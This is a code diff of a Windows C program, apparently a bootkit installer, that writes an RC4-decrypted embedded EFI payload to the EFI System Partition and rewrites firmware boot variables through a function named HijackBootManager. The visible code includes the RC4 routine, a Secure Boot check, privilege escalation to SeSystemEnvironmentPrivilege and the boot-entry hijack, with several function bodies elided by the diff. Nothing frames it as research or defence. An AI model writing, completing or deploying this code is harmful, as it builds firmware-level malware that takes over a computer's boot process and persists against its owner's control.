@@ -1,56 +1,43 @@
-#define WIN32_LEAN_AND_MEAN
-/* UNICODE and _UNICODE are set via compiler flags (-municode / /DUNICODE) */
-
-#include <windows.h>
-#include <winioctl.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <wchar.h>
+#include "main.h"
 #include "payload.h"
 
 #define MAX_PATH 260
-
-extern int InstallDriver(void);
-
-/* ------------------------------------------------------------------ */
-/*  EFI / UEFI constants                                              */
-/* ------------------------------------------------------------------ */
-
-#define EFI_VARIABLE_NON_VOLATILE        0x00000001
-#define EFI_VARIABLE_BOOTSERVICE_ACCESS  0x00000002
-#define EFI_VARIABLE_RUNTIME_ACCESS      0x00000004
-#define TARGET_ATTRIBUTES \
-    (EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS)
-
-#define MEDIA_DEVICE_PATH          0x04
-#define MEDIA_FILEPATH_DP          0x04
-#define END_DEVICE_PATH_TYPE       0x7F
-#define END_ENTIRE_DEVICE_PATH_SUBTYPE 0xFF
-
-#define LOAD_OPTION_ACTIVE         0x00000001
-
-#define TARGET_BOOT_INDEX          0x0009
-#define TARGET_BOOT_VAR            L"Boot0009"
 
 #define BOOT_DESCRIPTION           L"Custom EFI Loader"
 
 #define EFI_DEST_RELATIVE_PATH     L"\\EFI\\CUSTOM\\loader.efi"
 #define EFI_DEST_UEFI_PATH         L"\\EFI\\CUSTOM\\loader.efi"
 
-#pragma pack(push, 1)
-typedef struct {
-    UINT8  Type;
-    UINT8  SubType;
-    UINT8  Length[2];
-} EFI_DEVICE_PATH_PROTOCOL;
-#pragma pack(pop)
+#define TARGET_BOOT_INDEX          0x0009
+#define TARGET_BOOT_VAR            L"Boot0009"
 
-BOOLEAN PrepareRegistryData(void);
+void Rc4Crypt(unsigned char* Data, long DataLen, unsigned char* Key, int KeyLen) {
+    unsigned char S[256];
+    int i, j = 0;
+    unsigned char Temp;
 
-/* ------------------------------------------------------------------ */
-/*  Helper: enable SeSystemEnvironmentPrivilege                        */
-/* ------------------------------------------------------------------ */
+    for (i = 0; i < 256; i++) {
+        S[i] = i;
+    }
+    for (i = 0; i < 256; i++) {
+        j = (j + S[i] + Key[i % KeyLen]) % 256;
+        Temp = S[i];
+        S[i] = S[j];
+        S[j] = Temp;
+    }
+
+    i = 0;
+    j = 0;
+    for (long k = 0; k < DataLen; k++) {
+        i = (i + 1) % 256;
+        j = (j + S[i]) % 256;
+        Temp = S[i];
+        S[i] = S[j];
+        S[j] = Temp;
+        Data[k] ^= S[(S[i] + S[j]) % 256];
+    }
+}
+
 static BOOL EnablePrivilege(LPCWSTR PrivName)
 {
     HANDLE Token;
@@ -73,9 +60,6 @@ static BOOL EnablePrivilege(LPCWSTR PrivName)
     return Ok && (Err == ERROR_SUCCESS);
 }
 
-/* ------------------------------------------------------------------ */
-/*  Secure Boot check                                                  */
-/* ------------------------------------------------------------------ */
 BOOL CheckSecureBoot(void)
 {
     DWORD  Size = sizeof(BYTE);
@@ -113,14 +97,6 @@ BOOL CheckSecureBoot(void)
     printf("==========================\n\n");
     return IsSecureBootEnabled;
 }
-
-/* ------------------------------------------------------------------ */
-/*  Find the EFI System Partition drive letter                         */
-/* ------------------------------------------------------------------ */
-static const GUID EspPartitionTypeGuid = {
-    0xC12A7328, 0xF81F, 0x11D2,
-    { 0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B }
-};
 
 static BOOL GuidEqual(const GUID* A, const GUID* B)
 {
@@ -204,9 +180,6 @@ static BOOL FindEspMountPoint(WCHAR* OutPath, DWORD OutSize)
     return FALSE;
 }
 
-/* ------------------------------------------------------------------ */
-/*  Build EFI_LOAD_OPTION                                              */
-/* ------------------------------------------------------------------ */
 static BYTE* BuildLoadOption(const WCHAR* EfiUefiPath,
     DWORD* OutSize,
     BYTE* HwPrefix,
@@ -258,9 +231,6 @@ static BYTE* BuildLoadOption(const WCHAR* EfiUefiPath,
     return Buf;
 }
 
-/* ------------------------------------------------------------------ */
-/*  Hijack Boot Manager                                                */
-/* ------------------------------------------------------------------ */
 static BOOL HijackBootManager(void)
 {
     WORD  BootOrderBuf[256] = { 0 };
@@ -386,10 +356,6 @@ static BOOL HijackBootManager(void)
     return TRUE;
 }
 
-/* ------------------------------------------------------------------ */
-/*  FIXED: Write embedded EFI payload to ESP                          */
-/*  Mimics CopyFileW behavior from the working version                */
-/* ------------------------------------------------------------------ */
 BOOL WriteEfiPayloadToEsp(LPCWSTR EspPath, unsigned char* PPayload, DWORD PayloadSize)
 {
     /* ---- Payload sanity check ---- */
@@ -569,34 +535,6 @@ BOOL WriteEfiPayloadToEsp(LPCWSTR EspPath, unsigned char* PPayload, DWORD Payloa
     return TRUE;
 }
 
-void Rc4Crypt(unsigned char* Data, long DataLen, unsigned char* Key, int KeyLen) {
-    unsigned char S[256];
-    int i, j = 0;
-    unsigned char Temp;
-
-    for (i = 0; i < 256; i++) {
-        S[i] = i;
-    }
-    for (i = 0; i < 256; i++) {
-        j = (j + S[i] + Key[i % KeyLen]) % 256;
-        Temp = S[i];
-        S[i] = S[j];
-        S[j] = Temp;
-    }
-
-    i = 0;
-    j = 0;
-    for (long k = 0; k < DataLen; k++) {
-        i = (i + 1) % 256;
-        j = (j + S[i]) % 256;
-        Temp = S[i];
-        S[i] = S[j];
-        S[j] = Temp;
-        Data[k] ^= S[(S[i] + S[j]) % 256];
-    }
-}
-
-
 int wmain()
 {
     printf("============================================================\n");
@@ -656,8 +594,6 @@ int wmain()
         TARGET_BOOT_INDEX, BOOT_DESCRIPTION);
     printf("    EFI installed at ESP:%ls\n", EFI_DEST_RELATIVE_PATH);
     printf("============================================================\n");
-
-    int Status = InstallDriver();
 
     return 0;
 }
